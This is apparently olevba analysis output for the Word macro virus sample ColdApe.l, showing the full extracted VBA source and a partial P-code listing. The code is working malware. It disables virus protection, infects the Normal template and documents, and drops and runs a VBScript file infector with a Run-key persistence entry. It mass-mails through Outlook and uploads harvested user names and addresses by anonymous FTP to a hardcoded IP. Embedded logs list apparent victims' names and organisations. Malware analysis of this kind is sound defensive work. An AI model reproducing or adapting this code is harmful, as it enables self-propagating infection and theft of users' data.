olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ColdApe.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

()
'AVM
On Error Resume Next
Dim DC, IT As Integer
a = ActiveDocument.Saved
Application.EnableCancelKey = 1 And 0
Options.VirusProtection = 1 And 0
Options.ConfirmConversions = 1 And 0
gen = 51
gen = 50
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "'" & Application.UserName & " Loves Nicky F. Also! " & Now
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
If IT >= 30 Then IT = 0
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Or IT = 0 Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "If mid(IV11,(len(IV11)-2),1) <> ""¥"" Then"
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
Print #1, "TS.Write IV3"
Print #1, "TS.Close"
Print #1, "End If"
Print #1, "End If"
Print #1, "Next"
Print #1, "Next"
Print #1, "FIV11 (IV7)"
Print #1, "If T111 = False Then"
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM"", IV7"
Print #1, "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
Print #1, "U187.Write IV3"
Print #1, "U187.Close"
Print #1, "End If"
Print #1, "Function FIV11(filespec)"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "If (IV6.FileExists(filespec)) Then"
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'¥"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If
If SIY = True And GoOk = True Then
If Dir("c:\A4.vbs") = "" Then
Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""avm@redneck.efga.org"" Else EMADDY = ""nick@virusbtn.com"""
Print #1, "if x = 1 then MSGBDY = IPADDY & " & Chr(34) & Str(gen) & " " & Now & Chr(34) & " else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Close 1
End If
Shell "wscript c:\a4.vbs", vbHide
End If
If ActiveDocument.Saved <> a Then ActiveDocument.Saved = a
' Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM
'Biacuone Loves Nicky F. Also! 11/18/98 12:48:59 PM
'cmurthy Loves Nicky F. Also! 14-12-1998 9:45:26 AM
'beastman Loves Nicky F. Also! 12-01-1999 3:57:50 PM
'Krishna Kumar Loves Nicky F. Also! 19-01-1999 3:43:22 PM
'gaddison Loves Nicky F. Also! 15-02-1999 8:29:10 AM
'Claire Hamilton  Loves Nicky F. Also! 2/03/99 16:35:56
'Yarra Valley Water Ltd Loves Nicky F. Also! 9/03/1999 14:41:41
'Kerrie Robertson Loves Nicky F. Also! 10/03/99 13:35:58
End Sub
Private Sub Document_New()

'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
'Spiros Lefteriotis Loves Nicky F. Also! 04-May-99 10:25:17 PM
'Building M Open Access Lab Loves Nicky F. Also! 6/05/99 10:46:11
'Andrew Ly Loves Nicky F. Also! 5/9/99 10:22:32 AM
'Business Loves Nicky F. Also! 5/14/99 11:08:54 AM
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 06:35:17 PM - Tuesday, 26 Jan 1999
' lynn ann casey
'



' 10:10:39  - Wednesday, 27 Jan 1999
' Jo Baldock
'



' 10:49:33 AM - Monday, 1 Feb 1999
' Richard P. Panico
'



' 05:11:22 PM - Wednesday, 3 Feb 1999
' Jennifer A. Johnsonj
'



' 02:03:10  - Tuesday, 9 Feb 1999
' Coles Myer Ltd.
'



' 05:05:46  - Wednesday, 10 Feb 1999
' Coles Myer Ltd.
'



' 02:04:06 PM - Monday, 22 Feb 1999
' Sally Papworth
'



' 12:39:10 PM - Tuesday, 2 Mar 1999
' Coles Myer Ltd.
'



' 06:58:41  - Wednesday, 3 Mar 1999
' Sonja Mills
'



' 12:02:55 PM - Tuesday, 16 Mar 1999
' Coles Myer Ltd.
'



' 04:44:14 PM - Wednesday, 24 Mar 1999
' RMIT University Library
'



' 11:47:20 AM - Friday, 26 Mar 1999
' RMIT University Library
'



' 07:42:40 PM - Tuesday, 20 Apr 1999
' RMIT University Library
'



' 12:19:56  - Friday, 23 Apr 1999
' Phi
'



' 06:29:13 PM - Thursday, 29 Apr 1999
' Business
'



' 10:21:23  - Tuesday, 18 May 1999
' Building M Open Access Lab
'


'Peter Bowring Loves Nicky F. Also! 30/05/1999 13:26:29


'rdeane Loves Nicky F. Also! 11/06/1999 12:57:07 PM


'Pat Price Loves Nicky F. Also! 25-Jun-1999 12:28:05


'ldonnelly Loves Nicky F. Also! 12/07/1999 1:59:04 PM


'SKM Loves Nicky F. Also! 19/7/1999 11:28:15 AM



' 11:59:03 AM - Tuesday, 27 Jul 1999
' DOT
'


'DOT User Loves Nicky F. Also! 27/07/99 14:50:14



' 10:40:29  - Friday, 6 Aug 1999
' DOT User
'


'DOT User Loves Nicky F. Also! 6/08/99 2:41:43 pm


'DOT User Loves Nicky F. Also! 8/9/99 11:28:32 AM


'David Enright Loves Nicky F. Also! 12/08/99 9:18:38


'David Enright Loves Nicky F. Also! 13/08/99 8:29:17


'DOT User Loves Nicky F. Also! 27/08/99 10:19:36



' 03:05:45  - Friday, 27 Aug 1999
' DOT User
'



' 09:48:58 AM - Monday, 20 Sep 1999
' Ditry PC
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.ColdApe.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 25703 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' 	Reparse 0x0002 "()"
' Line #3:
' 	QuoteRem 0x0000 0x0003 "AVM"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Dim 
' 	VarDefn DC
' 	VarDefn IT (As Integer)
' Line #6:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St a 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #10:
' 	LitDI2 0x0033 
' 	St gen 
' Line #11:
' 	LitDI2 0x0032 
' 	St gen 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " Loves Nicky F. Also! "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #14:
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #15:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #16:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #20:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #21:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Paren 
' 	St IT 
' Line #25:
' 	Ld IT 
' 	LitDI2 0x001E 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St IT 
' 	EndIf 
' Line #26:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St DC 
' Line #27:
' 	Ld DC 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld DC 
' 	Ld IT 
' 	Lt 
' 	Or 
' 	Ld IT 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St GoOk 
' Line #29:
' 	Ld IT 
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TestCon 
' Line #32:
' 	LitStr 0x0000 ""
' 	LitStr 0x0026 "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0008 "VBScript"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SIY 
' 	EndIf 
' Line #33:
' 	Ld SIY 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld TestCon 
' 	LitStr 0x0004 "Done"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #34:
' 	LitStr 0x000C "c:\happy.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'§"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Dim T111"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IV5(200)"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Dim XR"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set WSHShell = Wscript.CreateObject("Wscript.Shell")"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Set WshSysEnv = WSHShell.Environment("Process")"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "IV10 = WshSysEnv("Path")"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "IV7 = WSHShell.ExpandEnvironmentStrings("%windir%\avm.vbs")"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "IV1 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set IV6 = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "XR = 1"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "T11 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "For x = Len(IV10) To 1 Step -1"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "IV4 = Mid(IV10, x, 1)"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "If IV4 <> ";" Then"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV4 + IV5(XR)"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "ElseIf IV4 = ";" Then"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "XR = XR + 1"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 1) = WSHShell.SpecialFolders("Desktop") + "\""
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "IV5(XR + 2) = WSHShell.SpecialFolders("MyDocuments") + "\""
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 3) = WSHShell.SpecialFolders("Startup") + "\""
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "IV5(XR + 4) = Left(T11, InStrRev(T11, "\"))"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Set TS = IV6.OpenTextFile(T11, 1)"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "IV9 = TS.ReadAll"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "IV8 = Chr(167)"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "endIV8 = "'" & IV8"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "For x = Len(IV9) To 1 Step -1"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "If Mid(IV9, x, 1) = IV8 Then"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "x = 1"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "IV3 = endIV8 + IV3"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "ElseIf Mid(IV9, x, 1) <> IV8 Then"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
